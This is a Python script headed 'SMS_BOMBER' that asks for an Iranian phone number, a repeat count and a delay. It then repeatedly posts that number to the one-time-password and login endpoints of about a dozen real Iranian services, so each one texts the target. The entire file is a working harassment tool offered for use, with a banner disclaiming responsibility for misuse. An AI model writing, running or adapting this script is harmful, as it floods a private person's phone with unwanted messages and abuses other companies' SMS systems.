import requests
import time

print("""
//////////////////////////////////////////////////////////////////////////////
//                                                                          //
//                             ** SMS_BOMBER **                             //
//                           Create by : Hossein_F                          //
//                          Instagram : @h_xnighet                          //
//                                                                          //
//                                                                          //
//                               *Attention*                                //
//                     This program is made for fan jokes                   //
//      Any wrongdoing and anything that happens is your responsibility     //
//                    and we are not responsible for it                     //
//                                                                          //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////
""")

print("Enter your target number (0912*******)  only type iranian number")

target = input("target number : ")

print("The number of repetitions (1/2/3/4/...)")
tedad = int(input("repetition : "))
print("Enter the repetition time in seconds")
time_n = int(input("Repeat time : "))

print("""
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                                                                              //
//      The spam process has started. Please do not exit the program until you see the ** END ** message        //
//                                                                                                              //
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
""")




for i in range(tedad):

    time.sleep(time_n)
    
    #mydigipay
    data = {"cellNumber":target,"device":{"deviceId":"d520c7a8-421b-4563-b955-f5abc56b97ec","deviceModel":"WEB_BROWSER","deviceAPI":"WEB_BROWSER","osName":"WEB"}}
    r = requests.post("https://app.mydigipay.com/digipay/api/users/send-sms",json=data)

    #namava
    data = {"UserName":target}
    r = requests.post("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",json=data)


    #talentcoach
    data = {"cellphone":"+98"+target}
    r = requests.post("https://rest.talentcoach.ir/api/v1/service/trainees/check",json=data)


    #divar
    data = {"phone":target}
    r = requests.post("https://api.divar.ir/v5/auth/authenticate",json=data)


    #zarinplus
    data = {"phone_number":f"98{target}","source":"zarinplus"}
    r = requests.post("https://api.zarinplus.com/user/zarinpal-login",json=data)


    #tap30
    data = {"credential":{"phoneNumber":target,"role":"SCHEDULED_DELIVERY_SENDER"}}
    r = requests.post("https://tap33.me/api/v2/user",json=data)

    #shad
    data = {"api_version":"3","method":"sendCode","data":{"phone_number":target,"send_type":"SMS"}}
    r = requests.post("https://shadmessenger12.iranlms.ir/",json=data)
    
    #snap
    data = {"phone": target}
    r = requests.post(url="https://api.snapp.ir/api/v1/sms/link", json=data)
    
    #digikala
    data = {"backUrl":"/","username":target,"otp_call":False}
    r = requests.post(url="https://api.digikala.com/v1/user/authenticate/", json=data)

    #ezpay
    data = {"phoneNumber":target,"os":"Windows","osVersion":"10","browser":"Chrome","browserVersion":"108.0.0.0","device":"","presenterCode":""}
    r = requests.post(url="https://app.ezpay.ir:8443/open/v1/user/validation-code", json=data)
    
    #cafe_bazaar
    data = {"properties":{"language":2,"clientID":"jveob4zvyf9xaourbyzm0detvg51qe0r","deviceID":"jveob4zvyf9xaourbyzm0detvg51qe0r","clientVersion":"web"},"singleRequest":{"getOtpTokenRequest":{"username":target}}}
    r = requests.post(url="https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", json=data)

    #iraniansteam
    data = {"phone": target}
    r = requests.post(url="https://ezskins.ir/api/v1/auth", json=data)


    print("*************"+"Again"+"*************")

print("""
//////////////////////////////////////////////////////////////////////////////
//                                                                          //
//                             ** END **                                    //
//                                                                          //
//////////////////////////////////////////////////////////////////////////////
""")
